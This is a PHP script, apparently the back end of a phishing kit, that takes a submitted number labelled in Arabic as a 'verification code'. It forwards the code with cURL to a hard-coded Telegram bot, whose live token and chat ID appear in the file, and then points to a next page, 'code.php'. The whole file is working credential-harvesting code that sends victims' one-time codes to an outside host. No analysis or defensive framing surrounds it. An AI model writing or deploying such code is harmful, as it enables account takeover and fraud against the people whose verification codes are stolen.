<?php

    $_SESSION['number']=  $_POST['number'];
   
    
    $number = $_SESSION['number'];

   


        // $apiToken = $token;
    
        // $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
        // Prepare the POST data
        $databot = 'كود التحقق : ' . $number . PHP_EOL ;
       
        // $sender = [
        //     'chat_id' => $tokenID,
        //     'text' => $databot,
        // ];
    // DIE($databot);

   
    
    // // Initialize cURL
    // $curl = curl_init($url);
    // curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    // curl_setopt($curl, CURLOPT_POST, true);
    // curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
    // // Execute cURL request
    // $response = curl_exec($curl);

    $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
    // Prepare the POST data
    $senderr = [
        'chat_id' => 908949980,
        'text' => $databot,
    ];
    // DIE($databot);

   
    
    // Initialize cURL
    $curll = curl_init($urll);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
    
    // Execute cURL request
    $response = curl_exec($curll);



    $url = 'code.php';
    $date = ['url'=>$url];
   

    
    // Set cURL options


   



?>